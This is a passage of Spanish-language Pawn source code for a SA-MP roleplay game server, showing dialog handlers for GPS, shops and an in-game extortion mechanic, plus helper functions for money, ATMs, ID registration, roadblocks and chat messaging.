	            	case 4: SetPlayerCheckpoint(playerid, 1094.3595, -1390.4651, 13.7299, 3.0);
	            	case 5: SetPlayerCheckpoint(playerid, 776.8192, -1389.5275, 13.6205, 3.0);
	            	case 6: SetPlayerCheckpoint(playerid, 1560.0825, -1093.1130, 23.6643, 3.0);
	            	case 7: SetPlayerCheckpoint(playerid, 2781.5659, -1814.6296, 11.8438, 3.0);
	            	case 8: SetPlayerCheckpoint(playerid, 1631.6582, -1166.1237, 24.0781, 3.0);
	            	case 9: SetPlayerCheckpoint(playerid, 2264.9971, -1339.5735, 23.9818, 3.0);
	            	case 10: SetPlayerCheckpoint(playerid, 1022.4526, -1122.9113, 23.8707, 3.0);
         		} Mensaje(playerid, COLOR_BLANCO, "{018CFE}GPS: {FFFFFF}Ubicacion establecida en el mapa.");
	    	} else ShowPlayerDialog(playerid, GPS_DIALOG, DIALOG_STYLE_LIST, "{018CFE}Control GPS", "{FFFFFF}Bares\nEmergencias\nNegocios\nLugares Públicos\nServicios", "Aceptar", "Salir");
		}
		case SERVICIOS:
		{
		    if(response)
		    {
				switch(listitem)
				{
				    case 0: SetPlayerCheckpoint(playerid, 1602.6504, -2169.1699, 13.6598, 3.0);
				    case 1: SetPlayerCheckpoint(playerid, 2073.0464, -1913.1292, 13.5469, 3.0);
				    case 2: SetPlayerCheckpoint(playerid, 2028.8326, -1419.2201, 16.9922, 3.0);
				} Mensaje(playerid, COLOR_BLANCO, "{018CFE}GPS: {FFFFFF}Ubicacion establecida en el mapa.");
	    	} else ShowPlayerDialog(playerid, GPS_DIALOG, DIALOG_STYLE_LIST, "{018CFE}Control GPS", "{FFFFFF}Bares\nEmergencias\nNegocios\nLugares Públicos\nServicios", "Aceptar", "Salir");
		}
		case DIALOG_ESTADO:
		{
			if(response)
			{
  				switch(listitem)
	        	{
	            	case 0:
	            	{
	                    ShowPlayerDialog(playerid, DIALOG_REG_ESTADO, DIALOG_STYLE_INPUT, "{FFFFFF}Escribe tu estado", "{FFFFFF}Como máximo puedes escribir 17 carácteres", "Aceptar", "Cancelar");
    	         	}
					case 1:
					{
					    if(EstadoON[playerid] == 0)
						{
							Delete3DTextLabel(Estado[playerid]);
							Estado[playerid] = Create3DTextLabel(cuenta[playerid][pEstado], COLOR_GRIS3, 1.0, 1.0, 1.0, 15.0, 0, 1);
							Attach3DTextLabelToPlayer(Estado[playerid], playerid, 0.0, 0.0, 0.3);
							EstadoON[playerid] = 1;
							DialogoEstado(playerid);
						}
						else if(EstadoON[playerid] == 1)
						{
							Delete3DTextLabel(Estado[playerid]);
							EstadoON[playerid] = 0;
							DialogoEstado(playerid);
						}
					}
				}
			}
		}
		case DIALOG_REG_ESTADO:
		{
			if(response)
			{
        	    if(!palabrasProhibidas(inputtext) && strlen(inputtext) < 18 && strlen(inputtext) > 0 && strfind(inputtext, "=", true) == -1 && strfind(inputtext, "\n", true) == -1)
				{
					strmid(cuenta[playerid][pEstado], inputtext, 0, strlen(inputtext), 18);
					DialogoEstado(playerid);
				}
				else return ShowPlayerDialog(playerid, DIALOG_REG_ESTADO, DIALOG_STYLE_INPUT, "{FFFFFF}Formato Inválido", "{FFFFFF}Has insertado un formato inválido. Límite 17 carácteres.\n Ej: Triste", "Aceptar", "Cancelar");
	        }
    	}
    	case DELE_BUY_SEX:
    	{
    	    if(response)
    	    {
    	        switch(listitem)
    	        {
					case 0:{
                        if(verificarDinero(playerid, 150))
		            	{
							ShowPlayerDialog(playerid, DELE_BUY_SEXF, DIALOG_STYLE_LIST, "{DD1111}Tienda Sexual {FFFFFF}- Ropa De Mujer", "Ropa de Sexo 1\nRopa de Sexo 2\nRopa de Sexo 3\nRopa de Sexo 4\nRopa de Sexo 5\nRopa de Sexo 6\nRopa de Sexo 7\nRopa de Sexo 8", "Aceptar", "Salir");
						}
					}
					case 1:{
						if(verificarDinero(playerid, 150))
		            	{
							ShowPlayerDialog(playerid, DELE_BUY_SEXM, DIALOG_STYLE_LIST, "{DD1111}Tienda Sexual {FFFFFF}- Ropa De Hombre", "Ropa de Sexo 1\nRopa de Sexo 2\nRopa de Sexo 3\nRopa de Sexo 4", "Aceptar", "Salir");
						}
					}
					case 2:{
					    if(verificarDinero(playerid, 350))
					    {
							ShowPlayerDialog(playerid, DELE_BUY_SEXJ, DIALOG_STYLE_LIST, "{DD1111}Tienda Sexual {FFFFFF}- Juguetes De Diversion", "Juguete 1\nJuguete 2\nJuguete 3\nJuguete 4", "Aceptar", "Salir");
						}
					}
				}
			}
		}
    	case DELE_BUY_SEXF:
		{
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0:	SetPlayerSkin(playerid, 63);
					case 1:	SetPlayerSkin(playerid, 75);
					case 2: SetPlayerSkin(playerid, 85);
         			case 3: SetPlayerSkin(playerid, 87);
            		case 4: SetPlayerSkin(playerid, 152);
		            case 5: SetPlayerSkin(playerid, 178);
		            case 6: SetPlayerSkin(playerid, 256);
		            case 7: SetPlayerSkin(playerid, 257);
            	}
             	ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
	            Mensaje(playerid, COLOR_BLANCO, "Has comprado un Traje de Sexo Femenino.");
	            pierdeDinero(playerid, 170);
	            return 1;
           	}
    	}
    	case DELE_BUY_SEXM:
    	{
    	    if(response)
    	    {
    	        switch(listitem)
    	        {
    	            case 0: SetPlayerSkin(playerid, 18);
	            	case 1: SetPlayerSkin(playerid, 97);
		            case 2: SetPlayerSkin(playerid, 154);
		            case 3: SetPlayerSkin(playerid, 252);
				}
    			ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
       			Mensaje(playerid, COLOR_BLANCO, "Has comprado un Traje de Sexo Masculino.");
          		pierdeDinero(playerid, 170);
	            return 1;
         	}
    	}
    	case DELE_BUY_SEXJ:
    	{
    	    if(response)
    	    {
    	        switch(listitem)
    	        {
    	            case 0: darArma(playerid, 10, 1);
	            	case 1: darArma(playerid, 11, 1);
		            case 2: darArma(playerid, 12, 300);
		            case 3: darArma(playerid, 13, 300);
				}
    			ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
       			Mensaje(playerid, COLOR_BLANCO, "Has comprado un Objeto De Diversion.");
          		pierdeDinero(playerid, 350);
	            return 1;
         	}
    	}
    	case DIALOGO_QUITAR_EXTORCION:
    	{
    	    if(response)
    	    {
    	    	format(negocio[QuitExtortion[playerid]][bExtortion], 24, "Sin Extorsionista");
    	    	format(string, sizeof(string), "Has dejado de ser el extorcionista del negocio de {FF7617}%s", PlayerName(ExtortionID[playerid]));
    	        Mensaje(playerid, COLOR_BLANCO, string);
    	        format(string, sizeof(string), "* %s ha aceptado dejar de ser el extorcionista de tu negocio.", PlayerName(playerid));
    	        Mensaje(ExtortionID[playerid], COLOR_GRIS2, string);
				OnBizzTextdrawUpdate(QuitExtortion[playerid]);
				QuitExtortion[playerid] = 999;
				ExtortionID[playerid] = 999; 
    	        return 1;
    	    }
    	    else
    	    {
    	        format(string, sizeof(string), "* %s no ha aceptado dejar de ser el extorcionista de tu negocio.", PlayerName(playerid));
    	        Mensaje(ExtortionID[playerid], COLOR_GRIS2, string);
    	        Mensaje(playerid, COLOR_GRIS2, "* Has rechazado una peticion.");
				QuitExtortion[playerid] = 999;
				ExtortionID[playerid] = 999; 
    	    }
    	}
    	case TIENDA_ELECTRONICA:
    	{
			DesaparecerSelecion(playerid, 1);
    	    if(response)
    	    {
    	        switch(listitem)
    	        {
    	            case 0:
    	            {
    	        		if(verificarDinero(playerid, 200))
		            	{
		                	new randphone = 100000 + random(899999);
							cuenta[playerid][cTelefono] = randphone;
							format(string, sizeof(string), "Has comprado un nuevo teléfono cuyo número es: %d", cuenta[playerid][cTelefono]);
				            Mensaje(playerid, COLOR_BLANCO, string);
							pierdeDinero(playerid, 200);
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    return 1;
						}
					}
					case 1:
					{
					    if(verificarDinero(playerid, 220))
						{
						    cuenta[playerid][cIpod] = 1;
				    		ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			            	Mensaje(playerid, COLOR_BLANCO, "Has comprado un Ipod, usa /ipod");
			            	pierdeDinero(playerid, 220);
			            	return 1;
      					}
  					}
  					case 2:
  					{
  					    if(verificarDinero(playerid, 100))
		        	    {
			        	    ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			            	darArma(playerid, 43, 36);
		            		Mensaje(playerid, COLOR_BLANCO, "Has comprado una cámara de fotos.");
			            	pierdeDinero(playerid, 100);
			            	return 1;
						}
					}
					case 3:
					{
					    if(verificarDinero(playerid, 260))
		    	        {
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    cuenta[playerid][cWalkie] = 1;
				            Mensaje(playerid, COLOR_BLANCO, "Compraste el Walkie-Talkie - /walkie - /frecuencia - /wt");
				            pierdeDinero(playerid, 260);
				            return 1;
						}
					}
					case 4:
					{
						if(verificarDinero(playerid, 100))
						{
                           ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
                           cuenta[playerid][cEstereo] = 1;
                           Mensaje(playerid, COLOR_BLANCO, "Compraste el Stereo. - /recogerstereo - /stereoprender - /colocarstereo");
                           pierdeDinero(playerid, 100);
						   return 1;
						}
					}
				}
			}
		}
	}
	return 1;
}
/******************************************************************************/
/*********************************[- Stocks -]*********************************/
/******************************************************************************/
stock EncontroNumeroCaracter(playerid)
{
	new string[MAX_PLAYER_NAME];
	GetPlayerName(playerid, string, sizeof(string));
	for(new i=0;i<sizeof(caracteresNovalidos);i++)
	{
		if(strfind(string, caracteresNovalidos[i], true) != -1) return true;
	}
	return false;
}
stock mostrarCajero(playerid)
{
	cajeros[enteroChar[cajeroslot]{playerid}][cajeroUse] = true;
	for(new i=0; i<11; i++)
	{
		TextDrawShowForPlayer(playerid, cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][i]);
	}
	SelectTextDraw(playerid, COLOR_ROJO);
	actualizarCajero(playerid);
	
	booleano[TextShow]{playerid} = true;
	PlayerTextDrawHide(playerid, InfoText[playerid][1]);
	PlayerTextDrawHide(playerid, InfoText[playerid][2]);
	PlayerTextDrawHide(playerid, InfoText[playerid][3]); 
	HideProgressBarForPlayer(playerid, bHambre[playerid]);
	
	TogglePlayerControllable(playerid, false);
	return 1;
}
stock actualizarCajero(playerid)
{
	new string[126];
	format(string, sizeof(string), "~n~Nombre: %s~n~~n~Num Tarjeta: %d~n~~n~Saldo: %d~n~", PlayerName(playerid), cuenta[playerid][cTarjeta], cuenta[playerid][cDineroBanco]);
	TextDrawSetString(cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][4], string);
	return 1;
}
stock ocultarCajero(playerid)
{
	if(enteroChar[cajeroslot]{playerid} != 255)
	{
		cajeros[enteroChar[cajeroslot]{playerid}][cajeroUse] = false;
		for(new i=0; i<11; i++)
		{
			TextDrawHideForPlayer(playerid, cajeros[enteroChar[cajeroslot]{playerid}][Textdcajero][i]);
		}
		CancelSelectTextDraw(playerid);
		enteroChar[cajeroslot]{playerid} = 255;
		booleano[TextShow]{playerid} = false;
		TogglePlayerControllable(playerid, true);
	}
	return 1;
}
stock AnimacionTalk(playerid, text[])
{
	new anim = GetPlayerAnimationIndex(playerid);
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if((anim != 1538 || anim != 1539 || anim != 1540 || anim != 1541 || anim != 1542)) // si no esta nadando
		{
			ApplyAnimation(playerid, "PED", "IDLE_chat", 4.1, 7, 5, 1, 1, 1);
			SetTimerEx("FinishHablar", strlen(text)*500, false, "d", playerid);
		}
	}
}
stock UpdateDniInformacion(playerid, tipo)
{
	new string[256];
	switch(cuenta[playerid][cOrigen])
	{
		    case 1: PlayerStatInfo[playerid][1] = "Japon";
		    case 2: PlayerStatInfo[playerid][1] = "Italia";
		    case 3: PlayerStatInfo[playerid][1] = "Arabe";
		    case 4: PlayerStatInfo[playerid][1] = "Rusia";
		    case 5: PlayerStatInfo[playerid][1] = "Francia";
		    case 6: PlayerStatInfo[playerid][1] = "China";
		    case 7: PlayerStatInfo[playerid][1] = "Alemania";
		    case 8: PlayerStatInfo[playerid][1] = "Argentina";
		    case 9: PlayerStatInfo[playerid][1] = "Colombia";
		    case 10: PlayerStatInfo[playerid][1] = "Bolivia";
		    case 11: PlayerStatInfo[playerid][1] = "Brasil";
		    case 12: PlayerStatInfo[playerid][1] = "Chile";
		    case 13: PlayerStatInfo[playerid][1] = "España";
		    case 14: PlayerStatInfo[playerid][1] = "Mexico";
		    case 15: PlayerStatInfo[playerid][1] = "Ecuador";
		    case 16: PlayerStatInfo[playerid][1] = "Estados Unidos";
		    case 17: PlayerStatInfo[playerid][1] = "Holanda";
		    case 18: PlayerStatInfo[playerid][1] = "Canada";
		    case 19: PlayerStatInfo[playerid][1] = "Uruguay";
		    case 20: PlayerStatInfo[playerid][1] = "Venezuela";
	}
	
	if(cuenta[playerid][cSexo] == 2){
		PlayerStatInfo[playerid][0] = "Femenino";
	}else{
		PlayerStatInfo[playerid][0] = "Masculino";
	}
	
	switch(tipo)
	{
		case 1: format(string, sizeof(string), "    Registrar Identidad~n~~n~~n~DNI: %d~n~~n~~r~Edad: %d~w~~n~~n~Sexo: %s~n~~n~Nacionalidad: %s~n~~n~Utiliza: las flechas para modificar sus datos y ~y~>>> ~w~para cambiar a modificar otros datos al terminar presionar ~g~~h~~h~Listo", DniValores[playerid][1], cuenta[playerid][cEdad], PlayerStatInfo[playerid][0], PlayerStatInfo[playerid][1]);
		case 2: format(string, sizeof(string), "    Registrar Identidad~n~~n~~n~DNI: %d~n~~n~Edad: %d~n~~n~~r~Sexo: %s~w~~n~~n~Nacionalidad: %s~n~~n~Utiliza: las flechas para modificar sus datos y ~y~>>> ~w~para cambiar a modificar otros datos al terminar presionar ~g~~h~~h~Listo", DniValores[playerid][1], cuenta[playerid][cEdad], PlayerStatInfo[playerid][0], PlayerStatInfo[playerid][1]);
		case 3: format(string, sizeof(string), "    Registrar Identidad~n~~n~~n~DNI: %d~n~~n~Edad: %d~n~~n~Sexo: %s~n~~n~~r~Nacionalidad: %s~w~~n~~n~Utiliza: las flechas para modificar sus datos y ~y~>>> ~w~para cambiar a modificar otros datos al terminar presionar ~g~~h~~h~Listo", DniValores[playerid][1], cuenta[playerid][cEdad], PlayerStatInfo[playerid][0], PlayerStatInfo[playerid][1]);
	}
	PlayerTextDrawSetString(playerid, InfoText[playerid][5], string);
	return 1;
}
stock obtenerDinero(playerid)
{
	return cuenta[playerid][cDinero];
}
stock SetPosEx(playerid, Float:X, Float:Y, Float:Z, Float:A, interiorid, worldid)
{
    SetPlayerPos(playerid, X, Y, Z);
    SetPlayerFacingAngle(playerid, A);
    SetPlayerInterior(playerid, interiorid);
    SetPlayerVirtualWorld(playerid, worldid);
	return 1;
}
stock PlayerName(playerid)
{
    new names[24];
    GetPlayerName(playerid, names, 24);
    new N[24];
    strmid(N, names, 0, strlen(names), 24);
    for(new i = 0; i < MAX_PLAYER_NAME; i++)
    {
        if (N[i] == '_') N[i] = ' ';
    }
    return N;
}
static ObtenerVehicle()
{
	new vehicleid = -1;
	for(new veh=1;veh<VEHICULOS_COMPRABLES;veh++)
	{
		if(!autos[veh][cOwned])
		{
		    vehicleid = veh;
		    break;
		}
	}
	return vehicleid;
}
stock Desbug(string[])
{
		new
			szFixed[1024], 
			iPos, 
			iLen;

		for (iLen = strlen(string); iPos < iLen; iPos ++)
			switch (string[iPos])
			{
				case 'à':	szFixed[iPos] = 151;
				case 'á':	szFixed[iPos] = 152;
				case 'â':	szFixed[iPos] = 153;
				case 'ä':	szFixed[iPos] = 154;
				case 'À':	szFixed[iPos] = 128;
				case 'Á':	szFixed[iPos] = 129;
				case 'Â':	szFixed[iPos] = 130;
				case 'Ä':	szFixed[iPos] = 131;
				case 'è':	szFixed[iPos] = 157;
				case 'é':	szFixed[iPos] = 158;
				case 'ê':	szFixed[iPos] = 159;
				case 'ë':	szFixed[iPos] = 160;
				case 'È':	szFixed[iPos] = 134;
				case 'É':	szFixed[iPos] = 135;
				case 'Ê':	szFixed[iPos] = 136;
				case 'Ë':	szFixed[iPos] = 137;
				case 'ì':	szFixed[iPos] = 161;
				case 'í':	szFixed[iPos] = 162;
				case 'î':	szFixed[iPos] = 163;
				case 'ï':	szFixed[iPos] = 164;
				case 'Ì':	szFixed[iPos] = 138;
				case 'Í':	szFixed[iPos] = 139;
				case 'Î':	szFixed[iPos] = 140;
				case 'Ï':	szFixed[iPos] = 141;
				case 'ò':	szFixed[iPos] = 165;
				case 'ó':	szFixed[iPos] = 166;
				case 'ô':	szFixed[iPos] = 167;
				case 'ö':	szFixed[iPos] = 168;
				case 'Ò':	szFixed[iPos] = 142;
				case 'Ó':	szFixed[iPos] = 143;
				case 'Ô':	szFixed[iPos] = 144;
				case 'Ö':	szFixed[iPos] = 145;
				case 'ù':	szFixed[iPos] = 169;
				case 'ú':	szFixed[iPos] = 170;
				case 'û':	szFixed[iPos] = 171;
				case 'ü':	szFixed[iPos] = 172;
				case 'Ù':	szFixed[iPos] = 146;
				case 'Ú':	szFixed[iPos] = 147;
				case 'Û':	szFixed[iPos] = 148;
				case 'Ü':	szFixed[iPos] = 149;
				case 'ñ':	szFixed[iPos] = 174;
				case 'Ñ':	szFixed[iPos] = 173;
				case '':	szFixed[iPos] = 64;
				case '¿':	szFixed[iPos] = 175;
				case '':	szFixed[iPos] = 177;
				case '#':	szFixed[iPos] = 35;
				case '&':	szFixed[iPos] = 38;
				default:	szFixed[iPos] = string[iPos];
			}
		return szFixed;
}
stock MakeWeapon(playerid, mats, weaponid, ammo){
	new x[64], materiales = cuenta[playerid][cMateriales];
	if(IsPlayerConnected(playerid)){
	    if(materiales < mats){
			format(x, sizeof(x), "* Te faltan %d materiales.", materiales - mats);
			Mensaje(playerid, COLOR_GRIS2, x);
			return 1;
	    }
	    else{
	        darArma(playerid, weaponid, ammo);
	        format(x, sizeof(x), "~w~arma creada~n~~r~materiales gastados:~w~%d", mats);
			GameTextForPlayer(playerid, x, 3000, 3);
			cuenta[playerid][cMateriales] -= mats;
			return 1;
	    }
	}
	return 1;
}
stock IsPlayerInVehicleRadio(playerid, Float:radius)
{
    new Float:r, Float:rr, Float:rrr, Float:rc, Float:rrc, Float:rrrc;
    GetPlayerPos(playerid, r, rr, rrr);
    for(new i; i < MAX_VEHICLES; i++)
    {
        GetVehiclePos(i, rc, rrc, rrrc);
        if(IsPlayerInRangeOfPoint(playerid, radius, rc, rrc, rrrc))
        {
            return i;
        }
    }
    return false;
}
stock GetVehicleFriendlyName(vehicleid)
{
	new GVFNstring[56];
	format(GVFNstring, sizeof(GVFNstring), CarName[GetVehicleModel(vehicleid)-400]);
	return GVFNstring;
}
stock CreateRoadblock(Object, Float:x, Float:y, Float:z, Float:Angle)
{
    for(new i = 0; i < sizeof(barreras); i++)
  	{
  	    if(!barreras[i][sCreated])
  	    {
            barreras[i][sCreated] = 1;
            barreras[i][sX] = x;
            barreras[i][sY] = y;
            barreras[i][sZ] = z - 0.7;
            barreras[i][sObject] = CreateDynamicObject(Object, x, y, z-0.9, 0, 0, Angle);
	        return 1;
  	    }
  	}
  	return 0;
}
stock DeleteAllbarreras(playerid)
{
    for(new i=0; i < sizeof(barreras); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 100.0, barreras[i][sX], barreras[i][sY], barreras[i][sZ]))
        {
	  	    if(barreras[i][sCreated])
	  	    {
	  	        barreras[i][sCreated] = 0;
	            barreras[i][sX] = 0.0;
	            barreras[i][sY] = 0.0;
	            barreras[i][sZ] = 0.0;
	            DestroyDynamicObject(barreras[i][sObject]);
	  	    }
  	    }
	}
    return 0;
}
stock DeleteClosestRoadblock(playerid)
{
    for(new i = 0; i < sizeof(barreras); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 5.0, barreras[i][sX], barreras[i][sY], barreras[i][sZ]))
        {
  	        if(barreras[i][sCreated])
            {
                barreras[i][sCreated] = 0;
                barreras[i][sX] = 0.0;
                barreras[i][sY] = 0.0;
                barreras[i][sZ] = 0.0;
                DestroyDynamicObject(barreras[i][sObject]);
                return 1;
  	        }
  	    }
  	}
    return 0;
}
stock CreateGps(gpsid, Float:x, Float:y, Float:z)
{
    new playerid;
    SetPlayerMapIcon(playerid, gpsid, x, y, z, 00 , COLOR_ROJO, MAPICON_GLOBAL_CHECKPOINT);
    if(IsPlayerInRangeOfPoint(playerid, 10, x, y, z))
    {
        RemovePlayerMapIcon(playerid, gpsid);
        Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}LLegó a su punto de encuentro.");
    }
    return playerid;
}
stock SetearInterior(cid, slot){
	switch(slot){
	    case 1:{
			casa[cid][hExitx]  =	2308.9350;
			casa[cid][hExity]  =   -1212.349;
			casa[cid][hExitz]  =	1049.0234;
			casa[cid][hInt]    =	6;
			casa[cid][hLevel]	=	2;
			casa[cid][hValue]	=	random(5000) + 3000;
		}
		case 2:{
			casa[cid][hExitx]  =	221.6000;
			casa[cid][hExity]  =   1143.599;
			casa[cid][hExitz]  =	1082.599;
			casa[cid][hInt]    =	4;
			casa[cid][hLevel]	=	4;
			casa[cid][hValue]	=	random(13000) + 17000;
		}
		case 3:{
			casa[cid][hExitx]  =	223.391784;
			casa[cid][hExity]  =   1287.512573;
			casa[cid][hExitz]  =	1082.140625;
			casa[cid][hInt]    =	1;
			casa[cid][hLevel]	=	3;
			casa[cid][hValue]	=	random(11000) + 9000;
		}
		case 4:{
			casa[cid][hExitx]  =	2333.2343;
			casa[cid][hExity]  =   -1077.164;
			casa[cid][hExitz]  =	1049.0234;
			casa[cid][hInt]    =	6;
			casa[cid][hLevel]	=	2;
			casa[cid][hValue]	=	random(8000) + 6000;
		}
		case 5:{
			casa[cid][hExitx]  =	-260.534912;
			casa[cid][hExity]  =   1456.652343;
			casa[cid][hExitz]  =	1084.016357;
			casa[cid][hInt]    =	4;
			casa[cid][hLevel]	=	4;
			casa[cid][hValue]	=	random(10000) + 40000;
		}
		case 6:{
			casa[cid][hExitx]  =	23.0000;
			casa[cid][hExity]  =   1405.59;
			casa[cid][hExitz]  =	1084.44;
			casa[cid][hInt]    =	5;
			casa[cid][hLevel]	=	6;
			casa[cid][hValue]	=	random(30000) + 70000;
		}
		case 7:{
			casa[cid][hExitx]  =	2282.9255;
			casa[cid][hExity]  =   -1140.018;
			casa[cid][hExitz]  =	1050.8984;
			casa[cid][hInt]    =	11;
			casa[cid][hLevel]	=	5;
			casa[cid][hValue]	=	random(25000) + 35000;
		}
		case 8:{
			casa[cid][hExitx]  =	83.0228;
			casa[cid][hExity]  =   1322.38;
			casa[cid][hExitz]  =	1083.51;
			casa[cid][hInt]    =	9;
			casa[cid][hLevel]	=	7;
			casa[cid][hValue]	=	random(60000) + 110000;
		}
		case 9:{
			casa[cid][hExitx]  =	2270.14282;
			casa[cid][hExity]  =   -1210.4099;
			casa[cid][hExitz]  =	1047.56250;
			casa[cid][hInt]    =	10;
			casa[cid][hLevel]	=	8;
			casa[cid][hValue]	=	random(50000) + 200000;
		}
		case 10:{
			casa[cid][hExitx]  =	2325.1443;
			casa[cid][hExity]  =   -1149.1332;
			casa[cid][hExitz]  =	1050.7101;
			casa[cid][hInt]    =	12;
			casa[cid][hLevel]	=	10;
			casa[cid][hValue]	=	random(200000) + 300000;
		}
	}
}
stock CheckPlayerDistanceToVehicle(Float:radi, playerid, vehicleid)
{
	if(IsPlayerConnected(playerid))
	{
	    new Float:PX, Float:PY, Float:PZ, Float:X, Float:Y, Float:Z;
	    GetPlayerPos(playerid, PX, PY, PZ);
	    GetVehiclePos(vehicleid, X, Y, Z);
	    new Float:Distance = (X-PX)*(X-PX)+(Y-PY)*(Y-PY)+(Z-PZ)*(Z-PZ);
	    if(Distance <= radi*radi)
	    {
	        return 1;
	    }
	}
	return 0;
}
stock pierdeDinero(playerid, amount)
{
	if(IsPlayerConnected(playerid))
	{
		    new a[14];
			format(a, sizeof(a), "~r~ -%d$", amount);
		    GameTextForPlayer(playerid, a, 5000, 1);
			MoneyGiveToPlayer(playerid, -amount);
			PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
	}
	return 1;
}
stock ganaDinero(playerid, amount)
{
	if(IsPlayerConnected(playerid))
	{
		    new a[12];
			format(a, sizeof(a), "~g~ %d$", amount);
		    GameTextForPlayer(playerid, a, 5000, 1);
			MoneyGiveToPlayer(playerid, amount);
			PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
	}
	return 1;
}
stock verificarDinero(playerid, money)
{
    if(IsPlayerConnected(playerid))
	{
	    new b[64];
	    new xx;
		xx = money - (obtenerDinero(playerid));
	    if(obtenerDinero(playerid) >= money)
		{
			return 1;
		}
		else
		{
		    format(b, sizeof(b), "No tienes dinero suficiente! Te faltan %d$", xx);
			Mensaje(playerid, COLOR_GRIS2, b);
			return 0;
		}
	}
	return 0;
}
stock Admin(lvl, playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new admin = cuenta[playerid][cAdministrador];
	    if(admin	>=	lvl)
		{
		    return 1;
		}
	}
	return 0;
}
stock ShowInfoForPlayer(playerid, text[], time)
{
  KillTimer(InfoTimer[playerid]);
  PlayerTextDrawHide(playerid, InfoText[playerid][0]); 
  PlayerTextDrawSetString(playerid, InfoText[playerid][0], text);
  PlayerTextDrawShow(playerid, InfoText[playerid][0]);
  InfoTimer[playerid] = SetTimerEx("HideInfoForPlayer", time, false, "i", playerid);
  return 1;
}
stock OOCOff(color, const string[]){
	for(new i=0, t=GetMaxPlayers();i<t;i++){
		if(IsPlayerConnected(i)){
			if(!booleano[gOoc]{i}){
				Mensaje(i, color, string);
			}
		}
	}
	return 1;
}
stock OOCNews(color, const string[])
{
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(!booleano[gNews]{i})
			{
				Mensaje(i, color, string);
			}
		}
	}
	return 1;
}
stock MensajeRango(Float:rango, playerid, color, string[])
{
	new Float:apx, Float:apy, Float:apz;
	GetPlayerPos(playerid, apx, apy, apz);
	
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(playerid, rango, apx, apy, apz))
		{
			if(cuenta[playerid][cMiembro] == cuenta[i][cMiembro])
			{
				Mensaje(i, color, string);
			}
		}
	}
	return 1;
}
stock SendRadioMessage(member, color, string[]){
	for(new i=0, t=GetMaxPlayers();i<t;i++){
		if(IsPlayerConnected(i)){
			if(cuenta[i][cMiembro] == member || cuenta[i][cLider] == member){
                if(booleano[RadioOn]{i}){
					Mensaje(i, color, string);
				}
			}
		}
	}
	return 1;
}
stock SendFamilyMessage(family, color, string[])
{
 for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(cuenta[i][cMiembro] == family || cuenta[i][cLider] == family)
		    {
                if(!booleano[gFam]{i})
                {
					Mensaje(i, color, string);
				}
			}
		}
	}
}
stock StopStream(playerid)
{
	DeletePVar(playerid, "pAudioStream");
    StopAudioStreamForPlayer(playerid);
}
stock PlayStream(playerid, url[], Float:posX = 0.0, Float:posY = 0.0, Float:posZ = 0.0, Float:distance = 50.0, usepos = 0)
{
	if(GetPVarType(playerid, "pAudioStream")) StopAudioStreamForPlayer(playerid);
	else SetPVarInt(playerid, "pAudioStream", 1);
    PlayAudioStreamForPlayer(playerid, url, posX, posY, posZ, distance, usepos);
}
stock PickUcEstereo(playerid)
{
    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
 		if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
   		{
     		StopStream(i);
		}
	}
	DeletePVar(playerid, "BBArea");
	DestroyDynamicObject(GetPVarInt(playerid, "PlacedBB"));
	DestroyDynamic3DTextLabel(Text3D:GetPVarInt(playerid, "BBLabel"));
	DeletePVar(playerid, "PlacedBB"); DeletePVar(playerid, "BBLabel");
 	DeletePVar(playerid, "BBX"); DeletePVar(playerid, "BBY"); DeletePVar(playerid, "BBZ");
	DeletePVar(playerid, "BBInt");
	DeletePVar(playerid, "BBVW");
	DeletePVar(playerid, "BBStation");
	return 1;
}
stock CreateStrip(Float:x, Float:y, Float:z, Float:Angle)
{
    for(new i = 0; i < sizeof(espinas); i++)
  	{
  	    if(espinas[i][sCreated] == 0)
  	    {
            espinas[i][sCreated]=1;
            espinas[i][sX]=x;
            espinas[i][sY]=y;
            espinas[i][sZ]=z-0.7;
            espinas[i][sObject] = CreateObject(2899, x, y, z-0.9, 0, 0, Angle-90);
	        return 1;
  	    }
  	}
  	return 0;
}
stock DeleteAllStrip()
{
    for(new i = 0; i < sizeof(espinas); i++)
  	{
  	    if(espinas[i][sCreated] == 1)
  	    {
  	        espinas[i][sCreated]=0;
            espinas[i][sX]=0.0;
            espinas[i][sY]=0.0;
            espinas[i][sZ]=0.0;
            DestroyObject(espinas[i][sObject]);
  	    }
	}
    return 0;
}
stock DeleteClosestStrip(playerid)
{
    for(new i = 0; i < sizeof(espinas); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 2.0, espinas[i][sX], espinas[i][sY], espinas[i][sZ]))
        {
  	        if(espinas[i][sCreated] == 1)
            {
                espinas[i][sCreated]=0;
                espinas[i][sX]=0.0;
                espinas[i][sY]=0.0;
                espinas[i][sZ]=0.0;
                DestroyObject(espinas[i][sObject]);
                return 1;
  	        }
  	    }
  	}
    return 0;
}
encode_tires(tires1, tires2, tires3, tires4){
